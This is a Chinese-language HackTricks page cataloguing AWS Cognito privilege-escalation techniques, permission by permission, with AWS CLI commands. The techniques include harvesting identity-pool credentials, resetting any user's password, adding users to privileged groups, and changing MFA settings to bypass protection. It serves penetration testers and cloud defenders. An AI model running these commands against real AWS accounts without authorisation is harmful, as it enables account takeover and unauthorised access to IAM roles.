# AWS - Cognito权限提升

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## Cognito

有关Cognito的更多信息，请查看：

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### 从身份池中收集凭据

由于Cognito可以向**已验证**和**未验证**的**用户**授予**IAM角色凭证**，因此，如果您找到应用程序的**身份池ID**（应该在应用程序中硬编码），您可以获取新的凭据，从而进行权限提升（在一个AWS账户中，您可能之前甚至没有任何凭据）。

有关更多信息，请查看[**此页面**](../aws-unauthenticated-enum-access/#cognito)。

**潜在影响：**直接提升到与未验证用户关联的服务角色（可能也是与已验证用户关联的角色）。
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
如果Cognito应用程序**未启用未经身份验证的用户**，您可能还需要权限`cognito-identity:UpdateIdentityPool`来启用它。

**潜在影响：**直接特权升级到任何Cognito角色。

### `cognito-identity:update-identity-pool`

具有此权限的攻击者可以设置一个受他控制的Cognito用户池或任何其他身份提供者，他可以登录为**访问此Cognito身份池的方式**。然后，只需**登录**到该用户提供者，就可以**让他访问身份池中配置的经过身份验证的角色**。
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
也可以滥用此权限以允许基本身份验证：
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**潜在影响**：入侵身份池中配置的经过身份验证的IAM角色。

### `cognito-idp:AdminAddUserToGroup`

此权限允许**将Cognito用户添加到Cognito组**，因此攻击者可以滥用此权限将受其控制的用户添加到具有**更高**特权或**不同IAM角色**的其他组中：
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**潜在影响：**提升权限以访问其他Cognito组和与用户池组相关联的IAM角色。

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

具备这些权限的攻击者可以使用**每个被入侵的Cognito身份提供者可用的IAM角色**创建/更新组，并将被入侵的用户加入到该组中，从而访问所有这些角色：

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**潜在影响：**提升至其他Cognito IAM角色。

### `cognito-idp:AdminConfirmSignUp`

此权限允许**验证注册**。默认情况下，任何人都可以在Cognito应用程序中注册，如果保留此权限，用户可以使用任意数据创建帐户并通过此权限进行验证。
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**潜在影响：**如果您能够注册一个新用户，则可以间接提升身份池IAM角色的权限，以供经过身份验证的用户使用。如果能够确认任何帐户，则可以间接提升其他应用功能的权限。

### `cognito-idp:AdminCreateUser`

此权限允许攻击者在用户池中创建新用户。新用户将被创建为启用状态，但需要更改其密码。
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**潜在影响：**对于已认证用户，可以直接提升至身份池IAM角色。对于其他应用功能，可以间接提升权限以创建任意用户。

### `cognito-idp:AdminEnableUser`

这个权限在一个非常特殊的情况下可能有帮助，即攻击者找到了一个被禁用的用户的凭证，并且需要**重新启用**该用户。
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**潜在影响：**对于已验证用户，可能导致间接特权升级至身份池IAM角色，并且如果攻击者拥有禁用用户的凭证，则可能导致用户权限泄露。

### `cognito-idp:AdminInitiateAuth`，**`cognito-idp:AdminRespondToAuthChallenge`**

此权限允许使用[**ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**方法进行登录**。有关更多信息，请参考链接。

### `cognito-idp:AdminSetUserPassword`

此权限将允许攻击者**更改任何用户的密码**，使其能够冒充任何未启用多因素身份验证的用户。
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**潜在影响：**直接提升权限，可能访问任何用户的组和身份池认证的IAM角色。

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**：攻击者可能滥用此权限，将自己控制的手机设置为用户的**短信多因素认证**。
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference（设置用户MFA首选项）：** 类似于前一个权限，可以使用此权限来设置用户的MFA首选项，以绕过MFA保护。
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: 类似于前一个权限，可以使用此权限来设置用户池的 MFA 首选项，以绕过 MFA 保护。
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** 还可以更新用户池以更改MFA策略。[在此处检查cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)。

**潜在影响:** 间接特权升级，可能适用于攻击者知道凭据的任何用户，这可能允许绕过MFA保护。

### `cognito-idp:AdminUpdateUserAttributes`

拥有此权限的攻击者可以更改受其控制的用户的电子邮件、电话号码或任何其他属性，以尝试在底层应用程序中获得更多特权。\
这允许更改电子邮件或电话号码并将其设置为已验证。
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**潜在影响：**使用Cognito用户池的底层应用程序中的潜在间接权限提升，根据用户属性授予权限。

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

拥有此权限的攻击者可以创建一个比已存在的池客户端更少限制的新用户池客户端。例如，新客户端可以允许任何类型的身份验证方法，不需要任何密钥，禁用令牌吊销，允许令牌有效期更长...

如果不是创建新客户端，而是修改现有客户端，也可以实现相同的效果。

在[**命令行**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)（或[**更新命令**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)）中，您可以查看所有选项，请检查！。
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**潜在影响：**通过创建一个放宽安全措施的新客户端，可能会对用户池使用的身份池授权用户进行间接权限提升，并使攻击者能够使用他能够创建的用户进行登录。

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

攻击者可以滥用此权限，通过上传包含新用户的 CSV 文件来创建用户。
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
（在创建新的导入作业的情况下，您可能还需要iam passrole权限，我还没有测试过）。

**潜在影响：**对于经过身份验证的用户，可以直接提升到身份池IAM角色。对于其他应用功能，可以间接提升权限以创建任何用户。

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

攻击者可以创建一个新的身份提供者，然后通过该提供者进行登录。
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**潜在影响：**对已认证用户的身份池IAM角色进行直接权限提升。对其他应用功能进行间接权限提升，能够创建任何用户。

### cognito-sync:\* 分析

这是Cognito身份池角色中默认的非常常见的权限。即使权限中有一个通配符总是看起来不好（特别是来自AWS），**从攻击者的角度来看，给定的权限并不是非常有用**。

此权限允许读取身份池和身份池内身份ID的用户信息（这不是敏感信息）。\
身份ID可能会被分配[**数据集**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html)，这是会话的信息（AWS将其定义为**保存的游戏**）。这可能包含某种敏感信息（但概率非常低）。您可以在[**枚举页面**](../aws-services/aws-cognito-enum/)中找到如何访问此信息的方法。

攻击者还可以使用这些权限**注册自己到发布更改的Cognito流**，或者**在Cognito事件上触发的lambda函数**。我没有看到这种用法，并且我不会期望在这里找到敏感信息，但这并非不可能。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
